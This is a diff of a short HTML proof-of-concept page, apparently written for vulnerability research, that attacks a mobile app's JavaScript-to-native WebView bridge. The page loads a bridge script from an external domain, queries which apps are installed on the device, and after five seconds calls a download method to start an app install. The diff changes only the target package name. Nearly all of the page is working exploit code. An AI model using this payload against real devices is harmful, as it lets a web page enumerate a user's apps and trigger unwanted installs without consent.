@@ -8,12 +8,12 @@
     <h1>Don't worried,this just a poc by HCSL.^_^</h1>
     <script type="text/javascript" src="https://wwwxhihonor.com/dsbridge.js"> </script>
     <script>
-        bridge.call("download.queryAppList", {pkgNameList: "com.ss.android.ugc.trill,com.whatapp"}, function (result_json) {
+        bridge.call("download.queryAppList", {pkgNameList: "com.zhiliaoapp.musically,com.whatapp"}, function (result_json) {
             alert(result_json)
         })
         setTimeout(() => {
             alert("Begin to install app")
-              bridge.call("download.downloadButtonOnClick",{packageName: "com.ss.android.ugc.trill"}, function (v) {
+              bridge.call("download.downloadButtonOnClick",{packageName: "com.zhiliaoapp.musically"}, function (v) {
            })
         }, 5000);       
     </script>    
